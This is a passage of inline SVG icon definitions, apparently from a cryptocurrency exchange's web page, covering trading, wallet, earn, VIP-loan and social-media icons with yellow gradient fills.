            <linearGradient id="paint0_linear" x1="8.5" y1="21.5" x2="8.5" y2="9.5" gradientUnits="userSpaceOnUse">
              <stop stop-color="#F0B90B"></stop>
              <stop offset="1" stop-color="#F8D33A"></stop>
            </linearGradient>
            <linearGradient id="paint1_linear" x1="6" y1="9" x2="6" y2="3" gradientUnits="userSpaceOnUse">
              <stop stop-color="#F0B90B"></stop>
              <stop offset="1" stop-color="#F8D33A"></stop>
            </linearGradient>
            <linearGradient id="paint2_linear" x1="18" y1="21" x2="18" y2="15" gradientUnits="userSpaceOnUse">
              <stop stop-color="#F0B90B"></stop>
              <stop offset="1" stop-color="#F8D33A"></stop>
            </linearGradient>
          </defs>
        </g>
      </symbol>
      <symbol viewBox="0 0 24 24" id="stock-token-g">
        <g>
          <circle r="10" transform="matrix(1 0 0 -1 12 12)" fill="url(#paint0_linear)"></circle>
          <path fill-rule="evenodd" clip-rule="evenodd" d="M21.8 14H18v-4h-2V8h-3V4h-2v4H8v2H6v4H2.2A10.001 10.001 0 0 0 6 20a9.986 9.986 0 0 0 2 1.168V20h3v1.95a10.106 10.106 0 0 0 2 0V20h3v1.168A9.986 9.986 0 0 0 18 20l.001-.001a10.001 10.001 0 0 0 3.8-6zM13 18h3v-2h-3v2zm0-4h3v-2h-3v2zm-2-2v2H8v-2h3zm0 4v2H8v-2h3z" fill="#76808F"></path>
          <defs>
            <linearGradient id="paint0_linear" x1="10" y1="0" x2="10" y2="20" gradientUnits="userSpaceOnUse">
              <stop stop-color="#F0B90B"></stop>
              <stop offset="1" stop-color="#F8D33A"></stop>
            </linearGradient>
          </defs>
        </g>
      </symbol>
      <symbol viewBox="0 0 24 24" id="strategy-trading-g">
        <path d="M9.5 11.5L3 18V21H21V7L13 15L9.5 11.5Z" fill="url(#paint0_linear_11027:40088)"></path>
        <path fill-rule="evenodd" clip-rule="evenodd" d="M20.9999 4.41421L13 12.4137L9.50002 8.91371L4.41476 13.999L3.00055 12.5848L8.79235 6.79295L9.50002 6.08528L13 9.58528L19.5857 3L20.9999 4.41421Z" fill="#76808F"></path>
        <path d="M16 3H21V8L16 3Z" fill="#76808F"></path>
        <defs>
          <linearGradient id="paint0_linear_11027:40088" x1="12" y1="7" x2="12" y2="21" gradientUnits="userSpaceOnUse">
            <stop stop-color="#F0B90B"></stop>
            <stop offset="1" stop-color="#F8D33A"></stop>
          </linearGradient>
        </defs>
      </symbol>
      <symbol viewBox="0 0 24 24" id="swap-farming">
        <path d="M21 7.99999L6 8V12H4V6L15 5.99999V2L21 7.99999Z" fill="#76808F"></path>
        <path d="M3 16L18 16V12H20V18L8.99999 18V22L3 16Z" fill="url(#paint0_linear_9345_86684)"></path>
        <defs>
          <linearGradient id="paint0_linear_9345_86684" x1="11.5" y1="22" x2="11.5" y2="12" gradientUnits="userSpaceOnUse">
            <stop stop-color="#F0B90B"></stop>
            <stop offset="1" stop-color="#F8D33A"></stop>
          </linearGradient>
        </defs>
      </symbol>
      <symbol viewBox="0 0 25 24" id="tooltip-f">
        <path fill-rule="evenodd" clip-rule="evenodd" d="M16.0469 18.0004H8.04688V21H16.0469V18.0004ZM7.71676 15.5004C6.09075 14.2186 5.04688 12.2312 5.04688 10C5.04688 6.13401 8.18088 3 12.0469 3C15.9129 3 19.0469 6.13401 19.0469 10C19.0469 12.2312 18.003 14.2186 16.377 15.5004H13.2969V13.1453L15.9674 10.4748L14.1996 8.70703L12.0469 10.8598L9.89416 8.70703L8.12638 10.4748L10.7969 13.1453V15.5004H7.71676Z" fill="currentColor"></path>
      </symbol>
      <symbol viewBox="0 0 24 24" id="trade-f">
        <path fill-rule="evenodd" clip-rule="evenodd" d="M15.0002 3.5C12.471 3.5 10.3406 5.20717 9.6983 7.53206C13.2833 7.86295 16.1373 10.7169 16.4682 14.3019C18.7931 13.6597 20.5002 11.5292 20.5002 9C20.5002 5.96243 18.0378 3.5 15.0002 3.5ZM14.5 15C14.5 11.9624 12.0376 9.5 9 9.5C5.96243 9.5 3.5 11.9624 3.5 15C3.5 18.0376 5.96243 20.5 9 20.5C12.0376 20.5 14.5 18.0376 14.5 15ZM6.5 15L9 17.5L11.5 15L9 12.5L6.5 15Z" fill="currentColor"></path>
      </symbol>
      <symbol viewBox="0 0 24 24" id="trading-fullscreen-g">
        <path d="M22 6.00024L2 6.00024L2 4.00025L22 4.00024L22 6.00024Z" fill="#76808F"></path>
        <path fill-rule="evenodd" clip-rule="evenodd" d="M22.0547 20.0002H14.4806L14.4806 8.00024H22.0547V20.0002ZM2.05469 8.00024H12.5194L12.5194 20.0002H2.05469V8.00024ZM7.3125 10.0002V18.0002L3.40625 14.094L7.3125 10.0002ZM16.7969 18.0002L16.7969 10.0002L20.7031 13.9065L16.7969 18.0002Z" fill="url(#paint0_linear_29203_26016)"></path>
        <defs>
          <linearGradient id="paint0_linear_29203_26016" x1="12.0547" y1="8.00024" x2="12.0547" y2="20.0002" gradientUnits="userSpaceOnUse">
            <stop stop-color="#F0B90B"></stop>
            <stop offset="1" stop-color="#F8D33A"></stop>
          </linearGradient>
        </defs>
      </symbol>
      <symbol viewBox="0 0 24 24" id="trading-interface-advanced-g">
        <g>
          <path d="M2 6h20V4H2v2z" fill="#76808F"></path>
          <path fill-rule="evenodd" clip-rule="evenodd" d="M2 8h9v12H2V8zm3 6l4-4v8l-4-4z" fill="url(#paint0_linear)"></path>
          <path fill-rule="evenodd" clip-rule="evenodd" d="M13 8h9v12h-9V8zm6 6l-4-4v8l4-4z" fill="#76808F"></path>
          <defs>
            <linearGradient id="paint0_linear" x1="6.5" y1="20" x2="6.5" y2="8" gradientUnits="userSpaceOnUse">
              <stop stop-color="#F0B90B"></stop>
              <stop offset="1" stop-color="#F8D33A"></stop>
            </linearGradient>
          </defs>
        </g>
      </symbol>
      <symbol viewBox="0 0 24 24" id="trading-interface-classic-g">
        <g>
          <path d="M22 6H2V4h20v2z" fill="#76808F"></path>
          <path d="M2 20h11V8H2v12z" fill="url(#paint0_linear)"></path>
          <path d="M15 20h7V8h-7v12z" fill="#76808F"></path>
          <defs>
            <linearGradient id="paint0_linear" x1="7.5" y1="20" x2="7.5" y2="8" gradientUnits="userSpaceOnUse">
              <stop stop-color="#F0B90B"></stop>
              <stop offset="1" stop-color="#F8D33A"></stop>
            </linearGradient>
          </defs>
        </g>
      </symbol>
      <symbol viewBox="0 0 24 24" id="transaction-history-f">
        <path fill-rule="evenodd" clip-rule="evenodd" d="M16.5969 16.5942C15.3277 17.8634 13.6642 18.498 12.0007 18.498H10.7507V20.998H12.0007C14.304 20.998 16.6073 20.1194 18.3646 18.362C21.8794 14.8473 21.8794 9.1488 18.3646 5.63409C14.8499 2.11937 9.15144 2.11937 5.63672 5.63409L7.40449 7.40185C9.94289 4.86344 14.0585 4.86344 16.5969 7.40185C19.1353 9.94026 19.1353 14.0558 16.5969 16.5942ZM13.25 8H10.75V12.5178L13.935 15.7027L15.7027 13.935L13.25 11.4822V8ZM5.62695 9.56836V10.7671L5.53498 10.7745C4.76841 10.8362 4.16351 11.0636 3.75156 11.4356C3.3419 11.8055 3.11328 12.327 3.11328 12.9999C3.11328 13.6835 3.35345 14.2228 3.7888 14.6417C4.22696 15.0634 4.86853 15.3684 5.67775 15.5671L5.75391 15.5858V17.4872L5.63096 17.4582C5.3568 17.3936 5.06065 17.2872 4.79344 17.1534C4.56662 17.0397 4.35592 16.9039 4.19711 16.7531L3.13862 17.9347C3.58482 18.3511 4.44775 18.7193 5.40673 18.9091L5.4873 18.9251V20.2017H7.06465V18.9955L7.15097 18.9836C7.94731 18.8736 8.50751 18.5361 8.86926 18.0926C9.23197 17.6479 9.40059 17.0899 9.40059 16.5314C9.40059 15.8621 9.15539 15.3544 8.73281 14.9631C8.30682 14.5686 7.6959 14.2883 6.96078 14.0892L6.88691 14.0692V12.267L7.01226 12.2999C7.41846 12.4063 7.82818 12.6105 8.11087 12.8579L9.14567 11.7222C8.7157 11.3225 8.04405 11.0255 7.27075 10.8606L7.1916 10.8438V9.56836H5.62695ZM5.81738 13.8398L5.67964 13.7837C5.45876 13.6937 5.29901 13.5986 5.19495 13.4808C5.08694 13.3586 5.04609 13.2204 5.04609 13.0627C5.04609 12.9304 5.07409 12.765 5.17186 12.6153C5.27119 12.4632 5.43668 12.3362 5.69397 12.2743L5.81738 12.2446V13.8398ZM6.87422 17.5178V15.7862L7.02148 15.8651C7.18744 15.9541 7.31318 16.0698 7.39684 16.2121C7.48042 16.3542 7.51855 16.5169 7.51855 16.6948C7.51855 16.8295 7.49833 16.9829 7.42252 17.1239C7.34533 17.2674 7.21476 17.3899 7.00937 17.467L6.87422 17.5178Z" fill="currentColor"></path>
      </symbol>
      <symbol viewBox="0 0 24 24" id="user-g">
        <path fill-rule="evenodd" clip-rule="evenodd" d="M7 13C4.79086 13 3 14.7909 3 17V21H21V17C21 14.7909 19.2091 13 17 13H15L12 16L9 13L7 13Z" fill="#76808F"></path>
        <path fill-rule="evenodd" clip-rule="evenodd" d="M16.5 6.5C16.5 4.01472 14.4853 2 12 2C9.51472 2 7.5 4.01472 7.5 6.5C7.5 8.98528 9.51472 11 12 11C14.4853 11 16.5 8.98528 16.5 6.5Z" fill="url(#paint0_linear_7_82)"></path>
        <defs>
          <linearGradient id="paint0_linear_7_82" x1="12" y1="11" x2="12" y2="2" gradientUnits="userSpaceOnUse">
            <stop stop-color="#F0B90B"></stop>
            <stop offset="1" stop-color="#F8D33A"></stop>
          </linearGradient>
        </defs>
      </symbol>
      <symbol viewBox="0 0 24 24" id="vault-g">
        <rect x="3" y="3" width="18" height="18" fill="#76808F"></rect>
        <path fill-rule="evenodd" clip-rule="evenodd" d="M12 5C15.866 5 19 8.13401 19 12C19 15.866 15.866 19 12 19C8.13401 19 5 15.866 5 12C5 8.13401 8.13401 5 12 5ZM12 14.9167L9.08333 12L12 9.08333L14.9167 12L12 14.9167Z" fill="url(#paint0_linear)"></path>
        <defs>
          <linearGradient id="paint0_linear" x1="12" y1="19" x2="12" y2="5" gradientUnits="userSpaceOnUse">
            <stop stop-color="#F0B90B"></stop>
            <stop offset="1" stop-color="#F8D33A"></stop>
          </linearGradient>
        </defs>
      </symbol>
      <symbol viewBox="0 0 24 24" id="vip-g">
        <path fill-rule="evenodd" clip-rule="evenodd" d="M1 10L7 4H17L23 10L12 21L1 10ZM10 8H8V10H10V8Z" fill="url(#paint0_linear_737_33914)"></path>
        <path d="M19 3L20.5 1.5L22 3L20.5 4.5L19 3Z" fill="#76808F"></path>
        <path d="M12.5 12L10 14.5L12.5 17L15 14.5L12.5 12Z" fill="#76808F"></path>
        <path d="M3.5 15L2 16.5L3.5 18L5 16.5L3.5 15Z" fill="#76808F"></path>
        <defs>
          <linearGradient id="paint0_linear_737_33914" x1="12" y1="21" x2="12" y2="4" gradientUnits="userSpaceOnUse">
            <stop stop-color="#F0B90B"></stop>
            <stop offset="1" stop-color="#F8D33A"></stop>
          </linearGradient>
        </defs>
      </symbol>
      <symbol viewBox="0 0 24 24" id="vip-loan-g">
        <path fill-rule="evenodd" clip-rule="evenodd" d="M7.73236 4.7677C10.8983 4.7677 13.4647 7.33417 13.4647 10.5001C13.4647 13.666 10.8983 16.2324 7.73236 16.2324C4.56647 16.2324 2 13.666 2 10.5001C2 7.33417 4.56647 4.7677 7.73236 4.7677ZM7.73236 12.9568L5.27563 10.5001L7.73236 8.04333L10.1891 10.5001L7.73236 12.9568Z" fill="url(#paint0_linear_34040_26824)"></path>
        <path d="M2 10.625H22V22H5C3.34315 22 2 20.6569 2 19V10.625Z" fill="#76808F"></path>
        <rect x="17" y="14.2324" width="5" height="4" fill="#F6CB2B"></rect>
        <path fill-rule="evenodd" clip-rule="evenodd" d="M18.0087 1.8927C20.213 1.8927 21.9999 3.6796 21.9999 5.88385C21.9999 8.0881 20.213 9.875 18.0087 9.875C15.8045 9.875 14.0176 8.0881 14.0176 5.88385C14.0176 3.6796 15.8045 1.8927 18.0087 1.8927ZM18.0087 7.59434L16.2982 5.88385L18.0087 4.17336L19.7192 5.88385L18.0087 7.59434Z" fill="url(#paint1_linear_34040_26824)"></path>
        <defs>
          <linearGradient id="paint0_linear_34040_26824" x1="7.73236" y1="16.2324" x2="7.73236" y2="4.7677" gradientUnits="userSpaceOnUse">
            <stop stop-color="#F0B90B"></stop>
            <stop offset="1" stop-color="#F8D33A"></stop>
          </linearGradient>
          <linearGradient id="paint1_linear_34040_26824" x1="18.0087" y1="9.875" x2="18.0087" y2="1.8927" gradientUnits="userSpaceOnUse">
            <stop stop-color="#F0B90B"></stop>
            <stop offset="1" stop-color="#F8D33A"></stop>
          </linearGradient>
        </defs>
      </symbol>
      <symbol viewBox="0 0 24 24" id="wallet-g-1">
        <g>
          <path d="M3 5.5A2.5 2.5 0 0 0 5.5 8H21v13H6a3 3 0 0 1-3-3V5.5z" fill="url(#paint0_linear)"></path>
          <path d="M5.5 3H21v5H5.5a2.5 2.5 0 0 1 0-5z" fill="#76808F"></path>
          <path d="M21 12v5h-5v-5h5z" fill="#76808F"></path>
          <defs>
            <linearGradient id="paint0_linear" x1="12" y1="21" x2="12" y2="5.5" gradientUnits="userSpaceOnUse">
              <stop stop-color="#F0B90B"></stop>
              <stop offset="1" stop-color="#F8D33A"></stop>
            </linearGradient>
          </defs>
        </g>
      </symbol>
    </svg>
    <svg aria-name="common" xmlns="http://www.w3.org/2000/svg" style="position: absolute; width: 0px; height: 0px; overflow: hidden;" aria-hidden="true">
      <symbol viewBox="0 0 24 24" id="account-f">
        <path fill-rule="evenodd" clip-rule="evenodd" d="M12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3ZM14.5 9.5C14.5 10.8807 13.3807 12 12 12C10.6193 12 9.5 10.8807 9.5 9.5C9.5 8.11929 10.6193 7 12 7C13.3807 7 14.5 8.11929 14.5 9.5ZM12 13.9961H8.66662C7.97115 13.9961 7.37518 14.7661 7.12537 15.5161C7.73252 16.4634 9.45831 17.9803 12 18.0023C14.5416 18.0243 16.3061 16.3616 16.8745 15.5161C16.6247 14.7661 16.0288 13.9961 15.3333 13.9961H12Z" fill="currentColor"></path>
      </symbol>
      <symbol viewBox="0 0 24 24" id="api-f">
        <path fill-rule="evenodd" clip-rule="evenodd" d="M10 5C6.13401 5 3 8.13401 3 12C3 15.866 6.13401 19 10 19H13V16H16V13H13V11H16V8H13V5H10ZM21 5H18V19H21V5Z" fill="currentColor"></path>
      </symbol>
      <symbol viewBox="0 0 24 24" id="app-download-f">
        <path fill-rule="evenodd" clip-rule="evenodd" d="M7.5 6V9H4.5V3H5H7.5H16H19V6V9H16V6H7.5ZM5 21H4.5V15H7.5V18H16V15H19V18V21H16H7.5H5ZM13.5088 12.0024L16.0176 12.0078L12.0088 16.0166L8 12.0078L10.5088 11.9832V8H13.5088V12.0024Z" fill="currentColor"></path>
      </symbol>
      <symbol viewBox="0 0 24 24" id="arrow-right-f">
        <path fill-rule="evenodd" clip-rule="evenodd" d="M21 11.9988L13.9289 4.92773L12.1612 6.6955L16.2157 10.75L2.99902 10.75L2.99902 13.25L16.2145 13.25L12.1612 17.3033L13.9289 19.0711L21 12L20.9994 11.9994L21 11.9988Z" fill="currentColor"></path>
      </symbol>
      <symbol viewBox="0 0 24 24" id="checkmark-f">
        <path fill-rule="evenodd" clip-rule="evenodd" d="M7.0354 16.8122L7.03392 16.8137L9.15524 18.935L9.15672 18.9335L9.15685 18.9337L11.2782 16.8124L11.278 16.8122L20.4689 7.62132L18.3476 5.5L9.15672 14.6909L5.62132 11.1555L3.5 13.2768L7.0354 16.8122Z" fill="currentColor"></path>
      </symbol>
      <symbol viewBox="0 0 24 24" id="close-f">
        <path d="M6.69806 4.57538L4.57674 6.6967L9.88004 12L4.57674 17.3033L6.69806 19.4246L12.0014 14.1213L17.3047 19.4246L19.426 17.3033L14.1227 12L19.426 6.6967L17.3047 4.57538L12.0014 9.87868L6.69806 4.57538Z" fill="currentColor"></path>
      </symbol>
      <symbol viewBox="0 0 24 24" id="crypto-f">
        <path fill-rule="evenodd" clip-rule="evenodd" d="M12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3ZM14.1642 18.5H12.5052V16.9617H11.4948V18.5H9.83585V16.9617H8.32773V7.03828H9.83585V5.5H11.4948V7.03828H12.5052V5.5H14.1642V7.08353C15.4611 7.29466 16.2152 8.2297 16.2152 9.58701C16.2152 10.9594 15.5969 11.5476 14.2848 11.7135V11.8039C15.6572 11.8794 16.5922 12.5731 16.5922 14.1265C16.5922 15.6497 15.5516 16.8863 14.1642 16.9617V18.5ZM13.0632 8.86311H10.4843V11.1102H13.0632C13.6363 11.1102 13.9832 10.8086 13.9832 10.2355V9.73782C13.9832 9.16473 13.6363 8.86311 13.0632 8.86311ZM13.4252 12.8596H10.4843V15.1369H13.4252C13.9983 15.1369 14.3602 14.8202 14.3602 14.2471V13.7494C14.3602 13.1763 13.9983 12.8596 13.4252 12.8596Z" fill="currentColor"></path>
      </symbol>
      <symbol viewBox="0 0 24 24" id="diamond-outline-s24">
        <g>
          <path d="M12.24 8L8 12.24l4.24 4.24 4.24-4.24L12.24 8zm-1.41 4.24l1.41-1.41 1.41 1.41-1.41 1.41-1.41-1.41z" fill="currentColor"></path>
        </g>
      </symbol>
      <symbol viewBox="0 0 24 24" id="earn-f">
        <path fill-rule="evenodd" clip-rule="evenodd" d="M3.63371 15.3239C3.95926 16.1426 4.40152 16.9023 4.93993 17.5823C6.58837 19.6643 9.13829 21 12.0001 21C16.9707 21 21.0001 16.9706 21.0001 12C21.0001 7.02944 16.9706 3 12 3C11.5568 3 11.1211 3.03203 10.6951 3.09391L11.0544 5.56795C11.3618 5.5233 11.6776 5.5 12.0001 5.5C12.0404 5.5 12.0806 5.50037 12.1206 5.50109C15.6549 5.56535 18.5001 8.45041 18.5001 12C18.5001 15.5899 15.59 18.5 12.0001 18.5C9.49239 18.5 7.31582 17.0802 6.2318 15.0003C6.13027 14.8057 6.0384 14.6054 5.95679 14.4002L3.63371 15.3239ZM3.09391 13.3049C3.03203 12.8789 3 12.4432 3 12C3 11.5568 3.03203 11.1211 3.09391 10.6951L5.56795 11.0544C5.5233 11.3618 5.5 11.6774 5.5 12C5.5 12.3226 5.5233 12.6382 5.56795 12.9456L3.09391 13.3049ZM5.95679 9.59984L3.63371 8.67609C3.95926 7.85737 4.40152 7.09773 4.93993 6.41771L6.89996 7.96958C6.51034 8.46168 6.19125 9.01019 5.95679 9.59984ZM6.41771 4.93993L7.96958 6.89996C8.46168 6.51034 9.01019 6.19125 9.59984 5.95679L8.67609 3.63371C7.85737 3.95926 7.09773 4.40152 6.41771 4.93993ZM8 12C8 9.79086 9.79086 8 12 8C14.2091 8 16 9.79086 16 12C16 14.2091 14.2091 16 12 16C9.79086 16 8 14.2091 8 12ZM13.6 12L12 13.6L10.4 12L12 10.4L13.6 12Z" fill="currentColor"></path>
      </symbol>
      <symbol viewBox="0 0 24 24" id="earn-s24">
        <path d="M11.3363 8.57657C10.5672 8.72738 10.2354 9.13457 10.2354 9.72274C10.2354 10.2958 10.5672 10.5974 11.3363 10.8086V8.57657Z" fill="currentColor"></path>
        <path d="M12.6785 15.3933C13.3873 15.1972 13.7191 14.7297 13.7191 14.1566C13.7191 13.7193 13.5382 13.2668 12.6785 13.0104V15.3933Z" fill="currentColor"></path>
        <path fill-rule="evenodd" clip-rule="evenodd" d="M12 21C16.9706 21 21 16.9706 21 12C21 7.02944 16.9706 3 12 3C7.02944 3 3 7.02944 3 12C3 16.9706 7.02944 21 12 21ZM12.8595 17.0522V18.5H11.1402V17.1125C9.61705 16.9768 8.60661 16.3585 7.85255 15.529L9.20985 14.2923C9.78294 14.8956 10.4918 15.3028 11.3363 15.4234V12.7088C9.07412 12.2413 8.15417 11.2459 8.15417 9.78306C8.15417 8.19954 9.19477 7.14385 11.1402 6.91763V5.5H12.8595V6.91763C14.066 7.05336 14.9558 7.52088 15.6194 8.27494L14.247 9.5116C13.885 9.10441 13.4024 8.77262 12.6785 8.60673V11.1102C14.7899 11.5928 15.8003 12.4524 15.8003 13.9907C15.8003 15.4687 14.8653 16.7204 12.8595 17.0522Z" fill="currentColor"></path>
      </symbol>
      <symbol viewBox="0 0 24 24" id="gift-f">
        <path d="M13.5 6.37868V3H10.5V6.37868L7.56065 3.43934L5.43933 5.56066L7.87867 8H4V11H10.75V8H13.25V11L20 11V8H16.1213L18.5607 5.56066L16.4393 3.43934L13.5 6.37868Z" fill="currentColor"></path>
        <path d="M4 13.5V20H10.75V13.5H4Z" fill="currentColor"></path>
        <path d="M13.25 20H20V13.5H13.25V20Z" fill="currentColor"></path>
      </symbol>
      <symbol viewBox="0 0 6307 1024" id="icon-binance-4th">
        <path d="M659.41504 74.79296h-147.78368v936.3456h147.78368V74.79296zM255.83616 340.1728h147.78368v422.7072H255.83616V340.13184z m616.12032 214.13888l-104.52992 104.57088 104.52992 104.57088 104.52992-104.57088-104.52992-104.57088z m-724.1728 60.70272H0v147.82464h147.78368v-147.8656z" fill="currentColor"></path>
        <path d="M1847.82848 541.98272L1742.68416 647.168l-106.04544-105.18528 106.0864-106.0864 105.10336 106.0864z m256.86016-256.94208l181.00224 181.0432 106.04544-106.0864-287.04768-286.18752-287.04768 287.1296 106.0864 106.0864 180.96128-181.98528z m362.00448 150.89664l-105.14432 106.0864 106.0864 106.04544 106.00448-106.0864-106.94656-106.0864z m-362.00448 363.02848l-181.00224-181.98528-106.04544 106.0864 287.04768 287.1296 287.04768-287.1296-106.0864-106.0864-180.96128 181.98528z m0-151.79776l106.04544-106.0864-106.04544-105.14432-106.04544 106.0864 106.04544 105.14432z m1115.25888 10.97728v-1.8432c0-68.56704-36.57728-103.34208-96.01024-126.1568 36.57728-20.15232 67.66592-53.08416 67.66592-110.67392v-1.8432c0-80.44544-64.9216-132.58752-169.12384-132.58752h-238.592v512.98304h244.08064c116.08064 0.94208 191.97952-46.61248 191.97952-139.8784z m-140.77952-219.46368c0 38.37952-31.08864 53.94432-81.34656 53.94432h-104.2432V383.7952h111.53408c47.5136 0 74.05568 19.2512 74.05568 53.0432v1.8432z m28.34432 204.8c0 38.42048-30.18752 55.78752-79.54432 55.78752h-134.3488v-112.47616h130.6624c57.63072 0 83.23072 21.05344 83.23072 55.78752v0.90112z m349.184 155.48416V285.04064h-113.33632v512.98304h113.33632v0.94208z m607.0272 0V285.04064h-111.57504v316.416l-240.4352-316.416h-104.16128v512.98304h111.49312v-325.50912l248.6272 326.4512h96.01024z m625.2544 0l-220.32384-516.66944h-104.20224l-220.32384 516.66944h116.1216l46.61248-115.22048h216.63744l46.61248 115.22048h118.86592z m-205.70112-214.91712h-136.192l68.56704-166.42048 67.62496 166.42048z m744.12032 214.91712V285.04064h-111.53408v316.416l-240.4352-316.416h-104.20224v512.98304h111.53408v-325.50912l248.6272 326.4512h96.01024z m582.28736-83.23072l-72.21248-72.25344c-40.22272 36.57728-75.85792 60.37504-135.29088 60.37504-87.73632 0-149.01248-73.15456-149.01248-160.9728v-2.70336c0-87.77728 62.17728-160.03072 149.01248-160.03072 51.2 0 91.42272 21.95456 131.64544 57.58976l72.21248-83.18976c-47.55456-46.65344-105.14432-79.54432-202.01472-79.54432-157.24544 0-267.83744 119.76704-267.83744 265.17504v1.80224c0 147.2512 112.4352 264.27392 263.24992 264.27392 98.7136 0.90112 157.24544-33.83296 210.24768-90.5216z m481.77152 83.23072V698.368h-278.81472v-107.88864h242.23744V489.8816h-242.23744V385.6384h275.12832V285.04064h-386.6624v512.98304h390.3488v0.94208z" fill="currentColor"></path>
      </symbol>
      <symbol viewBox="0 0 24 24" id="icon-h-coinmarketcap">
        <path fill-rule="evenodd" clip-rule="evenodd" d="M19.392 13.9478C19.0378 14.173 18.6265 14.1955 18.3066 14.0154C17.9068 13.7902 17.6783 13.2724 17.6783 12.5407V10.368C17.6783 9.30985 17.2556 8.56687 16.5473 8.36424C15.3477 8.01527 14.4452 9.46745 14.1139 10.0078L12.0003 13.385V9.25356C11.9775 8.30795 11.6576 7.73383 11.0635 7.56498C10.6751 7.4524 10.081 7.49743 9.50979 8.35298L4.78005 15.8503C4.15171 14.6683 3.8204 13.3399 3.8204 12.0003C3.8204 7.48618 7.48766 3.81632 12.0003 3.81632C16.513 3.81632 20.1802 7.48618 20.1802 12.0003C20.1802 12.0116 20.1802 12.0116 20.1802 12.0228C20.1802 12.0341 20.1802 12.0341 20.1802 12.0454C20.2145 12.9234 19.9289 13.6101 19.392 13.9478ZM21.9967 12.0003V11.9778V11.9553C21.9625 6.46177 17.4955 2.00391 12.0003 2.00391C6.4823 2.00391 2.00391 6.48428 2.00391 12.0003C2.00391 17.5164 6.4823 21.9967 12.0003 21.9967C14.5251 21.9967 16.9471 21.0511 18.7979 19.3288C19.1635 18.9911 19.1863 18.4169 18.8436 18.0455C18.5123 17.6852 17.9411 17.6515 17.5755 17.9892L17.564 18.0004C16.0674 19.3963 14.0682 20.1843 12.0003 20.1843C9.58976 20.1843 7.41911 19.1261 5.91108 17.4601L10.1838 10.7057V13.824C10.1838 15.3212 10.7779 15.8053 11.2692 15.9404C11.7604 16.0867 12.5144 15.9854 13.3141 14.7133L15.6562 10.9647C15.7361 10.8408 15.8047 10.7395 15.8618 10.6495V12.5407C15.8618 13.9366 16.433 15.051 17.4155 15.6026C18.3066 16.098 19.4262 16.0529 20.3402 15.4901C21.4598 14.8034 22.0539 13.5313 21.9967 12.0003Z" fill="currentColor"></path>
      </symbol>
      <symbol viewBox="0 0 24 24" id="icon-h-discord">
        <path d="M8.81861 12.4809C8.81861 13.1691 9.32333 13.7307 9.94218 13.7307C10.567 13.7307 11.0657 13.1689 11.0657 12.4809C11.0783 11.7927 10.5666 11.2311 9.94218 11.2311C9.31104 11.2311 8.81861 11.7929 8.81861 12.4809Z" fill="currentColor"></path>
        <path d="M12.9657 12.4809C12.9657 13.1691 13.4717 13.7307 14.0898 13.7307C14.7209 13.7307 15.2134 13.1689 15.2134 12.4809C15.226 11.7927 14.7142 11.2311 14.0898 11.2311C13.4588 11.2311 12.9657 11.7929 12.9657 12.4809Z" fill="currentColor"></path>
        <path fill-rule="evenodd" clip-rule="evenodd" d="M22 12C22 17.5228 17.5228 22 12 22C6.47715 22 2 17.5228 2 12C2 6.47715 6.47715 2 12 2C17.5228 2 22 6.47715 22 12ZM13.7742 7.27979C14.6769 7.43114 15.5417 7.70285 16.3559 8.07514H16.3582C17.7718 10.1392 18.4738 12.4746 18.2021 15.1636C17.122 15.9526 16.0679 16.4322 15.039 16.7479C14.7862 16.4071 14.5592 16.0408 14.3636 15.6559C14.736 15.5169 15.0901 15.3465 15.4302 15.1446C15.3634 15.0969 15.2993 15.0455 15.2338 14.9929C15.2131 14.9763 15.1923 14.9595 15.1711 14.9428C13.1385 15.8833 10.9098 15.8833 8.852 14.9428C8.76888 15.0119 8.68087 15.0818 8.59287 15.1446C8.93365 15.3465 9.28729 15.5169 9.65958 15.6559C9.464 16.0409 9.237 16.4071 8.98415 16.7479C7.95467 16.4323 6.90681 15.9526 5.82103 15.1636C5.60017 12.8407 6.04203 10.4864 7.67688 8.07514C8.48544 7.70236 9.35015 7.43135 10.2591 7.27979C10.3652 7.47536 10.4987 7.74078 10.5867 7.94893C11.5334 7.80993 12.4867 7.80993 13.4466 7.94893C13.5347 7.74078 13.6604 7.47536 13.7742 7.27979Z" fill="currentColor"></path>
      </symbol>
      <symbol viewBox="0 0 24 24" id="icon-h-dropdown-arrow">
        <path d="M16.5 8.49023V10.7402L12 15.5102L7.5 10.7402V8.49023H16.5Z" fill="currentColor"></path>
      </symbol>
      <symbol viewBox="0 0 24 24" id="icon-h-facebook">
        <path d="M22 12.0698C22 17.0832 18.3413 21.2485 13.5627 22.0107V14.9791H15.8987L16.336 12.0698H13.5733V10.1804C13.5733 9.38594 13.9573 8.60225 15.1947 8.60225H16.464V6.13312C16.464 6.13312 15.312 5.93988 14.224 5.93988C11.9413 5.93988 10.4373 7.33548 10.4373 9.84756V12.0698H7.89867V14.9791H10.4373V22.0107C5.65867 21.2378 2 17.0832 2 12.0698C2 6.50886 6.48 2 12.0053 2C17.5307 2 22 6.50886 22 12.0698Z" fill="currentColor"></path>
      </symbol>
      <symbol viewBox="0 0 24 24" id="icon-h-future-s">
        <path fill-rule="evenodd" clip-rule="evenodd" d="M8.5 3H20V16C20 18.2091 18.2091 20 16 20H7.5C5.567 20 4 18.433 4 16.5V9H8.5V3ZM11 14.5056V17.0056L17.5 17.0056V14.5056H11ZM8.5 11.5H6.5V16.5C6.5 17.0523 6.94772 17.5 7.5 17.5C8.05228 17.5 8.5 17.0523 8.5 16.5V11.5ZM12.5001 6.00562H17.5001V11.0056L15.8846 9.3901L13.2691 12.0056L11.5013 10.2379L14.1168 7.62233L12.5001 6.00562Z" fill="currentColor"></path>
      </symbol>
      <symbol viewBox="0 0 4010 1024" id="icon-h-futures">
